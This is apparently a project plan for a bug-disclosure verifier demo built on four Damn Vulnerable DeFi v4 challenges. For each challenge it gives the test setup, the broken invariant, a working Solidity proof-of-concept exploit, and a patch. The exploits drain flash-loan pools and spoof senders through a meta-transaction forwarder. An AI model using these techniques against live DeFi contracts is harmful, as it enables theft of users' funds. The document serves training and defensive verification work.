# DVDeFi v4 Extraction Plan

> Extraction analysis of 4 Damn Vulnerable DeFi v4 challenges for the Mnemo bug disclosure verifier demo.

Repo cloned to: `repos/damn-vulnerable-defi` (commit HEAD of `master`, v4.1.0 tag available).

---

## 1. Repository Structure Overview

```
damn-vulnerable-defi/
  foundry.toml          # Forge config: optimizer=200, Solidity =0.8.25
  remappings.txt        # Dependency path mappings
  lib/                  # Git submodule dependencies
    forge-std/
    openzeppelin-contracts/
    openzeppelin-contracts-upgradeable/
    solmate/
    solady/
    permit2/
    multicall/
    murky/
    safe-smart-account/
    v2-core/  v2-periphery/  v3-core/  v3-periphery/   # Uniswap (not needed)
  src/
    DamnValuableToken.sol         # Shared ERC20 token (solmate ERC20)
    DamnValuableNFT.sol           # Shared NFT (not needed)
    DamnValuableStaking.sol       # Shared staking (not needed)
    DamnValuableVotes.sol         # Shared votes (not needed)
    side-entrance/                # 1 contract
    truster/                      # 1 contract
    unstoppable/                  # 2 contracts (vault + monitor)
    naive-receiver/               # 4 contracts (pool, receiver, multicall, forwarder)
    ... 14 other challenge dirs   # Not needed
  test/
    side-entrance/SideEntrance.t.sol
    truster/Truster.t.sol
    unstoppable/Unstoppable.t.sol
    naive-receiver/NaiveReceiver.t.sol
```

**Key facts:**
- Solidity `=0.8.25` (exact version pin)
- Foundry-native: `forge test --mp test/<name>/<Name>.t.sol`
- No mainnet fork needed for any of our 4 targets (confirmed: no `createFork`, no `MAINNET_FORKING_URL` references)
- All 4 challenges work on a clean Anvil instance

---

## 2. Per-Challenge Extraction Sheets

### 2.1 Side Entrance

**Complexity: TRIVIAL** -- single contract, single dependency (solady), no tokens, pure ETH.

#### Contract Files

| File | Role |
|------|------|
| `src/side-entrance/SideEntranceLenderPool.sol` | Vulnerable contract |

#### Dependencies

- `solady/utils/SafeTransferLib.sol` (ETH safe transfer)
- No ERC20 tokens, no OpenZeppelin

#### Test Setup (from `test/side-entrance/SideEntrance.t.sol`)

```solidity
// Actors
address deployer = makeAddr("deployer");
address player   = makeAddr("player");
address recovery = makeAddr("recovery");

// Constants
uint256 constant ETHER_IN_POOL = 1000e18;
uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

// Deployment
pool = new SideEntranceLenderPool();
pool.deposit{value: ETHER_IN_POOL}();  // deployer funds pool with 1000 ETH
vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);  // player gets 1 ETH
```

#### Success Conditions / Invariants

```solidity
function _isSolved() private view {
    assertEq(address(pool).balance, 0, "Pool still has ETH");
    assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
}
```

**For our verifier, the invariant to CHECK (pre-exploit) is:**
- `address(pool).balance >= ETHER_IN_POOL` (pool retains its funds)

**The invariant BROKEN by the exploit is:**
- `address(pool).balance == 0` (pool fully drained)

#### Vulnerability Analysis

The `flashLoan()` function (line 35-43) sends ETH to the borrower via `execute{value: amount}()`, then checks `address(this).balance >= balanceBefore`. The flaw: calling `deposit()` inside the callback credits `balances[msg.sender]` while also satisfying the balance check (the ETH stays in the contract). The attacker then calls `withdraw()` to drain.

#### Working PoC Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

**Test body:**
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceAttacker attacker = new SideEntranceAttacker(address(pool), recovery);
    attacker.attack();
}
```

#### Patched Version Strategy

Block `deposit()` during an active flash loan:
```solidity
bool private _flashLoanActive;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    _flashLoanActive = true;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    _flashLoanActive = false;
    if (address(this).balance < balanceBefore) revert RepayFailed();
}

function deposit() external payable {
    require(!_flashLoanActive, "No deposits during flash loan");
    unchecked { balances[msg.sender] += msg.value; }
    emit Deposit(msg.sender, msg.value);
}
```

---

### 2.2 Truster

**Complexity: LOW** -- single contract + shared DamnValuableToken. The DVDeFi v4 test requires a single-transaction solution (nonce check), but for our verifier we can relax this.

#### Contract Files

| File | Role |
|------|------|
| `src/truster/TrusterLenderPool.sol` | Vulnerable contract |
| `src/DamnValuableToken.sol` | ERC20 token (pool asset) |

#### Dependencies

- `@openzeppelin/contracts/utils/Address.sol` (functionCall)
- `@openzeppelin/contracts/utils/ReentrancyGuard.sol`
- `solmate/tokens/ERC20.sol` (via DamnValuableToken)

#### Test Setup (from `test/truster/Truster.t.sol`)

```solidity
// Actors
address deployer = makeAddr("deployer");
address player   = makeAddr("player");
address recovery = makeAddr("recovery");

// Constants
uint256 constant TOKENS_IN_POOL = 1_000_000e18;

// Deployment
token = new DamnValuableToken();                    // Mints type(uint256).max to deployer
pool = new TrusterLenderPool(token);                // Constructor takes token address
token.transfer(address(pool), TOKENS_IN_POOL);      // Fund pool with 1M DVT
```

#### Success Conditions / Invariants

```solidity
function _isSolved() private view {
    assertEq(vm.getNonce(player), 1, "Player executed more than one tx");  // single-tx constraint
    assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
    assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```

**For our verifier, the invariant to CHECK (pre-exploit) is:**
- `token.balanceOf(address(pool)) >= TOKENS_IN_POOL` (pool retains tokens)

**The invariant BROKEN by the exploit is:**
- `token.balanceOf(address(pool)) == 0` (pool drained)

#### Vulnerability Analysis

`flashLoan()` (line 20-35) accepts arbitrary `target` and `data`, then calls `target.functionCall(data)` in the context of the pool. An attacker can pass `target = address(token)` and `data = abi.encodeCall(IERC20.approve, (attacker, type(uint256).max))`, causing the pool to approve the attacker to spend all its tokens. Then `transferFrom()` drains everything.

#### Working PoC Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    constructor(address _pool, address _token, address _recovery, uint256 _amount) {
        // Borrow 0, but use the arbitrary call to approve ourselves
        TrusterLenderPool(_pool).flashLoan(
            0,
            address(this),
            _token,
            abi.encodeCall(IERC20.approve, (address(this), _amount))
        );
        // Now we have approval, drain the pool
        DamnValuableToken(_token).transferFrom(_pool, _recovery, _amount);
    }
}
```

**Test body:**
```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterAttacker(address(pool), address(token), recovery, TOKENS_IN_POOL);
}
```

This deploys and drains in the constructor -- a single transaction, satisfying the nonce==1 check.

#### Patched Version Strategy

Remove arbitrary `target`/`data` parameters. Use a typed callback:
```solidity
function flashLoan(uint256 amount) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(msg.sender, amount);
    IFlashLoanBorrower(msg.sender).onFlashLoan(amount);
    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
    return true;
}
```

---

### 2.3 Unstoppable

**Complexity: LOW** -- but involves ERC4626, solmate, solady, and OZ. More imports but the exploit is trivial (1 line).

#### Contract Files

| File | Role |
|------|------|
| `src/unstoppable/UnstoppableVault.sol` | Vulnerable ERC4626 vault with flash loans |
| `src/unstoppable/UnstoppableMonitor.sol` | Monitor contract (checks flash loan health) |
| `src/DamnValuableToken.sol` | ERC20 token (vault asset) |

#### Dependencies

- `solady/utils/ReentrancyGuard.sol`
- `solmate/utils/FixedPointMathLib.sol`
- `solmate/auth/Owned.sol`
- `solmate/tokens/ERC4626.sol` (imports ERC20, SafeTransferLib)
- `@openzeppelin/contracts/utils/Pausable.sol`
- `@openzeppelin/contracts/interfaces/IERC3156.sol` (FlashBorrower + FlashLender)

#### Test Setup (from `test/unstoppable/Unstoppable.t.sol`)

```solidity
// Actors
address deployer = makeAddr("deployer");
address player   = makeAddr("player");

// Constants
uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

// Deployment
token = new DamnValuableToken();
vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

// Fund vault via ERC4626 deposit
token.approve(address(vault), TOKENS_IN_VAULT);
vault.deposit(TOKENS_IN_VAULT, address(deployer));

// Give player some tokens
token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

// Deploy monitor and transfer vault ownership to it
monitorContract = new UnstoppableMonitor(address(vault));
vault.transferOwnership(address(monitorContract));

// Verify flash loan works initially
monitorContract.checkFlashLoan(100e18);
```

#### Success Conditions / Invariants

```solidity
function _isSolved() private {
    // Flash loan check must FAIL
    vm.prank(deployer);
    vm.expectEmit();
    emit UnstoppableMonitor.FlashLoanStatus(false);
    monitorContract.checkFlashLoan(100e18);

    // Monitor paused the vault and transferred ownership to deployer
    assertTrue(vault.paused(), "Vault is not paused");
    assertEq(vault.owner(), deployer, "Vault did not change owner");
}
```

**For our verifier, the invariant to CHECK (pre-exploit) is:**
- Flash loan is callable: `vault.flashLoan(...)` does not revert
- Internally: `convertToShares(totalSupply) == totalAssets()` holds

**The invariant BROKEN by the exploit is:**
- Flash loan reverts with `InvalidBalance()` due to `convertToShares(totalSupply) != balanceBefore`

#### Vulnerability Analysis

In `flashLoan()` (line 85):
```solidity
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
```

This checks that the vault's internal accounting (shares vs assets) is consistent. `totalAssets()` returns `asset.balanceOf(address(this))` -- the actual token balance. If someone transfers tokens directly to the vault (bypassing `deposit()`), `totalAssets()` increases but `totalSupply` of shares stays the same. The check fails, permanently bricking flash loans.

#### Working PoC Exploit

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    // Transfer 1 token directly to vault, bypassing deposit()
    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
}
```

That is it. One line. The direct transfer breaks the `convertToShares(totalSupply) == totalAssets()` invariant forever.

#### Patched Version Strategy

Use internal accounting instead of `balanceOf`:
```solidity
uint256 private _totalManagedAssets;

function totalAssets() public view override returns (uint256) {
    return _totalManagedAssets;  // Not asset.balanceOf(address(this))
}

function afterDeposit(uint256 assets, uint256) internal override {
    _totalManagedAssets += assets;
}

function beforeWithdraw(uint256 assets, uint256) internal override {
    _totalManagedAssets -= assets;
}
```

---

### 2.4 Naive Receiver

**Complexity: MODERATE** -- 4 contracts, WETH dependency, meta-transactions (BasicForwarder with EIP-712), multicall pattern. The DVDeFi v4 challenge is significantly harder than its v3 predecessor.

#### Contract Files

| File | Role |
|------|------|
| `src/naive-receiver/NaiveReceiverPool.sol` | Flash loan pool (uses WETH, has deposits, multicall) |
| `src/naive-receiver/FlashLoanReceiver.sol` | Victim receiver contract |
| `src/naive-receiver/Multicall.sol` | Abstract multicall base (delegatecall loop) |
| `src/naive-receiver/BasicForwarder.sol` | EIP-712 meta-transaction forwarder |

#### Dependencies

- `solmate/tokens/WETH.sol`
- `solady/utils/EIP712.sol`
- `@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol`
- `@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol`
- `@openzeppelin/contracts/utils/Address.sol`
- `@openzeppelin/contracts/utils/Context.sol`
- `@openzeppelin/contracts/utils/cryptography/ECDSA.sol`

#### Test Setup (from `test/naive-receiver/NaiveReceiver.t.sol`)

```solidity
// Actors
address deployer = makeAddr("deployer");
address recovery = makeAddr("recovery");
(address player, uint256 playerPk) = makeAddrAndKey("player");

// Constants
uint256 constant WETH_IN_POOL = 1000e18;
uint256 constant WETH_IN_RECEIVER = 10e18;

// Deployment
weth = new WETH();
forwarder = new BasicForwarder();
pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
    address(forwarder), payable(weth), deployer  // deployer is feeReceiver
);
receiver = new FlashLoanReceiver(address(pool));

// Fund receiver with WETH
weth.deposit{value: WETH_IN_RECEIVER}();
weth.transfer(address(receiver), WETH_IN_RECEIVER);
```

#### Success Conditions / Invariants

```solidity
function _isSolved() private view {
    assertLe(vm.getNonce(player), 2);  // max 2 transactions
    assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
    assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
}
```

**For our verifier, the invariant to CHECK (pre-exploit) is:**
- `weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER` (receiver retains its funds)
- `weth.balanceOf(address(pool)) >= WETH_IN_POOL` (pool retains its funds)

**The invariant BROKEN by the exploit is:**
- Both receiver and pool are drained to 0

#### Vulnerability Analysis

This challenge has **two vulnerabilities** that must be chained:

**Vulnerability 1 -- Unauthorized flash loan initiation:** Anyone can call `flashLoan()` specifying any `receiver`. The receiver pays a 1 ETH fee each time. By calling `flashLoan(receiver, weth, 0, "")` 10 times (via multicall), an attacker drains the receiver's 10 ETH into the pool's `deposits[feeReceiver]` (the deployer).

**Vulnerability 2 -- Trusted forwarder _msgSender spoofing via multicall:** The `NaiveReceiverPool` inherits `Multicall` which uses `delegatecall`. The pool's `_msgSender()` checks if `msg.sender == trustedForwarder` and reads the last 20 bytes of calldata as the sender. Via `multicall`, a `delegatecall` preserves `msg.sender`. If you call `multicall` through the `BasicForwarder` (meta-tx), then inside the delegatecall, `msg.sender` is the forwarder. You can then append the deployer's address to the calldata of a `withdraw()` call, making `_msgSender()` return the deployer. This allows draining `deposits[deployer]` (which accumulated the 10 ETH in fees + original 1000 ETH).

**Full exploit chain:**
1. Use `multicall` to call `flashLoan(receiver, ...)` 10 times -- drains receiver, fees go to `deposits[deployer]`
2. Use `BasicForwarder.execute()` with a signed meta-tx that calls `pool.multicall([withdraw(1010 ETH, recovery, <deployer appended>)])` -- spoofs `_msgSender()` as deployer, drains all funds to recovery

This is significantly more complex than the other 3 challenges.

#### Working PoC Exploit

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // Step 1: Drain receiver via 10 flash loans (use multicall for single tx)
    bytes[] memory drainCalls = new bytes[](11);
    for (uint256 i = 0; i < 10; i++) {
        drainCalls[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 0, bytes(""))
        );
    }

    // Step 2: Withdraw all funds as deployer (feeReceiver) via forwarder spoofing
    // The 11th multicall entry: withdraw, with deployer address appended
    // Total in pool after draining receiver: 1000 + 10 = 1010 ETH
    // All in deposits[deployer] (1000 initial + 10 from fees)
    drainCalls[10] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))  // append deployer addr for _msgSender spoof
    );

    // Encode the multicall itself
    bytes memory multicallData = abi.encodeCall(pool.multicall, (drainCalls));

    // Sign a forwarder request from player
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 30_000_000,
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 hours
    });

    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
```

**Note:** The `bytes32(uint256(uint160(deployer)))` appended to the withdraw calldata is the key trick. When this goes through multicall (delegatecall), `msg.sender` is the forwarder (trusted), and the last 20 bytes of `msg.data` are the deployer's address, so `_msgSender()` returns deployer.

#### Patched Version Strategy

Two fixes needed:
1. **Require `msg.sender == address(receiver)` in `flashLoan()`** -- prevents third-party flash loan initiation
2. **Remove or fix `_msgSender()` override** -- the trusted forwarder pattern combined with multicall/delegatecall is fundamentally broken

---

## 3. Extraction Strategy Recommendation

### Option A: Minimal Extraction (copy 4 challenges + deps)

**What to copy:**
```
src/side-entrance/SideEntranceLenderPool.sol
src/truster/TrusterLenderPool.sol
src/unstoppable/UnstoppableVault.sol
src/unstoppable/UnstoppableMonitor.sol
src/naive-receiver/NaiveReceiverPool.sol
src/naive-receiver/FlashLoanReceiver.sol
src/naive-receiver/Multicall.sol
src/naive-receiver/BasicForwarder.sol
src/DamnValuableToken.sol
```

**What dependencies to include (as git submodules or vendored):**
- `lib/forge-std`
- `lib/openzeppelin-contracts` (Address, ReentrancyGuard, Pausable, IERC3156, ECDSA, Context, IERC20)
- `lib/solmate` (ERC20, ERC4626, WETH, Owned, FixedPointMathLib, SafeTransferLib)
- `lib/solady` (SafeTransferLib, ReentrancyGuard, EIP712)

**Pros:** Small footprint, easy to understand, fast compile
**Cons:** Must replicate remappings.txt, risk of missing a transitive import

### Option B: Fork the whole repo, delete what we do not need

**Approach:** Keep the full repo as a submodule. Only write test files for our 4 challenges with exploit solutions.

**Pros:** Zero risk of missing dependencies, `forge build` just works, can easily add more challenges later
**Cons:** Carries ~14 unused challenge directories, all Uniswap/Safe/permit2 submodules (~large)

### Recommendation: Option B (fork the whole repo)

**Rationale:**
1. The repo is already cloned at `repos/damn-vulnerable-defi`. It builds. It works.
2. Our verifier pipeline runs `forge test --mp test/<challenge>/<Name>.t.sol` -- this already isolates each challenge. We do not need to extract files.
3. Attempting minimal extraction risks subtle breakage (remapping issues, missing transitive deps from solmate/solady).
4. The unused challenges do not affect compile time (Forge only compiles what is referenced by the test being run).
5. For the TEE Docker image, we can use a `.forgeignore` or simply accept the extra ~50MB. The lib submodules are the bulk, and we need 3 of 13 anyway.

**What we actually do:**
- Keep `repos/damn-vulnerable-defi` as-is (or add as git submodule)
- Write our **exploit test files** as drop-in replacements for the empty `test_*()` functions
- Write **patched contract versions** alongside the originals (e.g., `src/side-entrance/SideEntranceLenderPoolPatched.sol`)
- Our verifier pipeline references this repo and runs `forge test`

---

## 4. Dependency Analysis

### Shared dependencies across all 4 challenges

| Dependency | Used By | Purpose |
|------------|---------|---------|
| `forge-std` | All 4 | Test framework |
| `solmate/tokens/ERC20.sol` | Truster, Unstoppable (via DVT) | Token base class |
| `@openzeppelin/contracts` | Truster, Unstoppable, Naive Receiver | Address, ReentrancyGuard, Pausable, IERC3156, ECDSA |
| `solady` | Side Entrance, Unstoppable, Naive Receiver | SafeTransferLib, ReentrancyGuard, EIP712 |
| `solmate` | Unstoppable, Naive Receiver | ERC4626, WETH, Owned, FixedPointMathLib |

### Per-challenge unique dependencies

| Challenge | Unique Deps |
|-----------|-------------|
| Side Entrance | None (only solady/SafeTransferLib) |
| Truster | OZ Address, OZ ReentrancyGuard |
| Unstoppable | solmate/ERC4626, solmate/Owned, solmate/FixedPointMathLib, solady/ReentrancyGuard, OZ Pausable, OZ IERC3156 |
| Naive Receiver | solmate/WETH, solady/EIP712, OZ ECDSA, OZ Context, OZ Address |

### Minimum lib submodules needed

1. `lib/forge-std` -- required
2. `lib/openzeppelin-contracts` -- required (Truster, Unstoppable, Naive Receiver)
3. `lib/solmate` -- required (DVT token, Unstoppable vault, WETH)
4. `lib/solady` -- required (Side Entrance, Unstoppable, Naive Receiver)

**Not needed:** openzeppelin-contracts-upgradeable, permit2, multicall, murky, safe-smart-account, v2-core, v2-periphery, v3-core, v3-periphery

---

## 5. Gotchas

### 5.1 Naive Receiver is significantly more complex than expected

The v4 version of Naive Receiver is NOT the simple "call flashLoan 10 times" from v3. It requires:
- Understanding the `Multicall` delegatecall pattern
- Understanding EIP-712 meta-transactions via `BasicForwarder`
- Exploiting the `_msgSender()` override combined with delegatecall context preservation
- Signing a meta-transaction with the player's private key

**Impact on verifier demo:** This is the hardest of the 4 to write a clean PoC for. The PoC itself requires off-chain signing (EIP-712). For a prover agent submitting a PoC as a Foundry test file, this works fine (Foundry has `vm.sign`). But it makes the "patched version" more complex -- you need two separate patches.

**Recommendation:** Start with Side Entrance and Truster for the MVP demo. Add Naive Receiver only if time permits. Unstoppable is a good middle-ground (trivial exploit, moderate setup).

### 5.2 Truster single-transaction constraint

The DVDeFi test requires `vm.getNonce(player) == 1` (single transaction). This means the exploit must be a single `CREATE` (deploy an attacker contract that does everything in its constructor). This is fine for a PoC but worth noting -- our verifier should not enforce this constraint since it is a CTF rule, not a vulnerability invariant.

### 5.3 Naive Receiver two-transaction constraint

Similarly, `vm.getNonce(player) <= 2`. CTF constraint, not a security invariant.

### 5.4 Solidity version pinning

All contracts use `=0.8.25` (exact, not `>=`). Our patched versions must use the same pragma or the remappings break.

### 5.5 No mainnet fork needed

All 4 challenges deploy fresh contracts on a clean EVM. No fork state, no block number dependencies, no oracle prices. This is ideal for our Anvil-in-TEE setup.

### 5.6 Unstoppable uses both solmate AND solady ReentrancyGuard

`UnstoppableVault` imports `ReentrancyGuard` from **solady** (not OZ, not solmate). This matters for patching -- do not confuse the three different ReentrancyGuard implementations.

### 5.7 DamnValuableToken mints max supply

`DamnValuableToken` constructor does `_mint(msg.sender, type(uint256).max)`. The deployer gets the full uint256 max supply. This is fine for tests but means the deployer has effectively infinite tokens.

---

## 6. Priority Order for Implementation

| Priority | Challenge | Reason |
|----------|-----------|--------|
| 1 | **Side Entrance** | Simplest. 1 contract, pure ETH, 1 dependency, trivial PoC, trivial patch. Perfect for MVP. |
| 2 | **Truster** | Simple. 2 contracts (pool + token), clean invariant, single-tx exploit. Good second example. |
| 3 | **Unstoppable** | Moderate setup (ERC4626 + monitor) but trivial exploit (1 line). Good for showing DoS severity class. |
| 4 | **Naive Receiver** | Complex. 4 contracts, EIP-712 signing, multicall+forwarder exploit chain. Only if time permits. |

For the hackathon demo, Side Entrance alone is sufficient to demonstrate the full verification pipeline. Truster adds variety (ERC20 vs ETH). Unstoppable adds a different severity class (DoS vs fund drain). Naive Receiver is bonus.
